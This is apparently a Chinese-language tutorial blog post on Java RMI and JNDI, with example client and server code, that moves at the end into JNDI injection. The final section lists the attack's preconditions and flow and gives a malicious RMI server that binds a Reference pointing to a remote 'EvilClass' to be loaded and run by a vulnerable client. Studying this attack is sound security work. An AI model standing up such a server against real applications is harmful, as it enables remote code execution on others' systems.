RMI与JNDI（一）

# RMI和JNDI

  • JNDI(Java Naming and Dictionary Interface)是一组应用程序接口，开发人员可以用它来定位用户、网络、服务、等资源。JDNI可以定位一个远程对象，而JNDI底层又是支持RMI远程对象的，RMI的注册服务可以通过JNDI来进行访问和调用。用户想要利用JNDI来查找某个资源，而JNDI底层可以使用RMI、LDAP等方式来去找到这个对象
  • RMI(Remote Method Invocation)远程方法调用，它是Java的一种机制，客户端本地只要有接口的定义，就可以通过提供相应的参数来调用远程服务器的方法，而远程服务器必须要实现具体的Java方法并提供相应的接口。

RMI一般由两部分组成：RMIServer和RMIRegistry（客户端Client除外）

RMIServer由三部分组成：

  • 一个继承了java.rmi.Remote的接口，接口中要定义我们远程实现的方法
  • 一个实现了这个接口的类
  • 一个主类，用于创建Registry（注册中心），通过这个Registry我们可以把一个具体对象绑定到一个地址上。

远程对象的实现类必须要继承UnicastRemoteObject类，如果不继承的话还需要手动初始化远程对象，就是在远程对象的的构造方法中调用UnicastRemoteObject#exportObject()这个静态方法。

关于Registry（注册中心）：

注册中心本身并不会去执行远程方法，但是它可以把一个Name和一个对象绑定起来，Client可以在注册中心查询该Name，然后得到对应的绑定关系，然后就可以连接RMIServer，实际的远程方法实际上是在RMIServer上调用的。

public interface Hello extends Remote {
    String sayHello() throws RemoteException;
}
public class HelloImpl extends UnicastRemoteObject implements Hello {
    protected HelloImpl() throws RemoteException {
        super();
    }

    @Override
    public String sayHello() throws RemoteException {
        System.out.println("call");
        return "Hello RMI";
    }
}
public class RMIServer {
    public static void main(String[] args) throws Exception {
        // 创建远程对象
        HelloImpl hello = new HelloImpl();
        // 在1099端口创建注册中心，实现对象绑定
        Registry registry = LocateRegistry.createRegistry(1099);
        // 把hello这个对象绑定在特定的地址上
        Naming.bind("rmi://127.0.0.1:1099/hello", hello);
        System.out.println("RMIServer is running");
    }
}
public class RMIClient {
    public static void main(String[] args) throws Exception {
        /*
        在客户段也要有Hello这个接口
         */
        // 通过Naming来寻找对象
        Hello hello = (Hello) Naming.lookup("rmi://127.0.0.1:1099/hello");
        /*
        Registry registry = LocateRegistry.getRegistry("192.168.199.215", 1099);
        Hello hello = (Hello) registry.lookup("hello");
         */
        // 调用远程方法
        System.out.println(hello.sayHello());

    }
}

整个过程：

  1. 客户端连接Registry，然后寻找其中名字是hello的对象
  2. Registry返回给客户端这个name=hello的对象的序列化数据，客户端反序列化，然后发现是远程对象，并且地址是{IP}:{port}，然后就和这个地址建立TCP连接
  3. 在这个TCP连接中实现了方法的远程调用

其中RMIServer的对象绑定和RMIClient客户端的对象寻找有两种方式：

// 基于Registry来实现对象的绑定和寻找

// 服务端
Registry registry = LocateRegistry.createRegistry(1099);
registry.bind("rmi://127.0.0.1:1099/hello", hello);

// 客户端
Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
Hello hello = (Hello) registry.lookup("rmi://127.0.0.1:1099/hello");
// 基于Naming来实现对象的绑定和寻找

// 服务端
LocateRegistry.createRegistry(1099);
Naming.bind("rmi://127.0.0.1:1099/hello", hello);

// 客户端
Hello hello = (Hello) Naming.lookup("rmi://127.0.0.1:1099/hello");

关于JNDI

JNDI和RMI的关系：

  • JNDI可以类比成URL，而RMI是一个协议

具体怎么理解呢？我们可以用RMI的Registry来在远程绑定一个对象，然后在JNDI中通过rmi://这个协议来访问绑定好的远程资源，但是JNDI底层的实现不仅可以通过RMI，还可以通过LDAP、DNS等等。类比到URL和网络协议，在网络中我们可以通过http协议来访问互联网上的资源，下载文件，但是其他协议，比如file、gopher等同样可以做到这些事情。

一般来说，JNDI来进行对象的绑定和寻找的时候也有两种方法：

/*
  写法一
*/

// 服务端

public class Server {
    public static void main(String[] args) throws Exception {
        HelloImpl hello = new HelloImpl();
        // 创建注册中心用于绑定远程对象
        LocateRegistry.createRegistry(1099);
        // 使用JNDI来创建RMI服务，需要设置工厂
        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        System.setProperty(Context.PROVIDER_URL, "rmi://127.0.0.1:1099/");

        InitialContext ctx = new InitialContext();
        ctx.bind("hello", hello);
        ctx.close();
    }
}

// 客户端

public class Client {
    public static void main(String[] args) throws Exception {
        // 客户端也需要设置上下文环境
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
        InitialContext ctx = new InitialContext(env);
        Hello hello = (Hello) ctx.lookup("hello");
        System.out.println(hello.sayHello());
    }
}
/*
  写法二
*/

// 服务端
public class Server {
    public static void main(String[] args) throws Exception {
        HelloImpl hello = new HelloImpl();
        // 创建注册中心用于绑定远程对象
        LocateRegistry.createRegistry(1099);

        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099/");
        InitialContext ctx = new InitialContext(env);

        ctx.bind("hello", hello);
        ctx.close();
    }
}

  • JNDI创建RMI服务需要预先指定Context.INITIAL_CONTEXT_FACTORY和Context.PROVIDER_URL这样的上下文环境，来指明其为RMI服务。

JNDI的协议动态转换

前面说过，JNDI在进行初始化的时候需要设置上下文环境，也就是要指名对应的服务工厂和PROVIDER_URL，但是JNDI是支持协议的动态转换的，如果我们没有设置上下文环境，则JNDI会根据传入的URL协议来自动设置对应的工厂和PROVIDER_URL：

/*
  JNDI协议动态转换
*/

// 服务端
public class Server {
    public static void main(String[] args) throws Exception {
        HelloImpl hello = new HelloImpl();
        LocateRegistry.createRegistry(1099);
        
        InitialContext ctx = new InitialContext();
        ctx.bind("rmi://127.0.0.1:1099/hello", hello);
        ctx.close();
    }
}


// 客户端
public class Client {
    public static void main(String[] args) throws Exception {
        InitialContext ctx = new InitialContext();
        Hello hello = (Hello) ctx.lookup("rmi://127.0.0.1:1099/hello");
        System.out.println(hello.sayHello());
    }
}

# JNDI注入

# Reference类

JNDI除了可以通过RMI服务来直接绑定远程对象之外还可以利用Reference类来创建一个不在当前名称目录系统之内的外部或者远程对象，在使用Reference类的时候，我们需要传入几个参数：

  • className：远程加载所使用的类名
  • classFactory：所需要实例化的类名
  • classFactoryLocation：远程加载类的地址，需要提供一个.class文件，协议可以为http、file等

# lookup方法参数可控

lookup参数可控所导致的JNDI注入最常见的一种情况。

利用前提：

  • InitialContext#lookup参数可控
  • JDK版本限制：<8u121

下文中例子JDK版本使用的是JDK 8u101

利用流程：

  1. 当InitialContext#lookup参数可控时，攻击者可以控制参数为rmi://{IP1}:{port1}/obj
  2. 攻击者在{IP1}:{port1}这个地址搭建恶意的RMI服务，其中利用Reference类来指定一个地址为http://{IP2}:{port2}的恶意的Class文件
  3. 现在JNDI客户端的RMI注册表中就会绑定恶意的Reference类，从而就会加载远程服务器上的恶意字节码文件到本地
  4. 客户端会调用这个类的static静态代码块和构造方法，从而触发攻击者在里面精心设置的恶意代码

// 服务端

public class Server {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        // 引入远程的恶意Class文件
        Reference reference = new Reference("EvilClass", "EvilClass", "http://127.0.0.1:8080/classFiles/");
        ReferenceWrapper ref = new ReferenceWrapper(reference);

        registry.bind("ref", ref);
    }
}
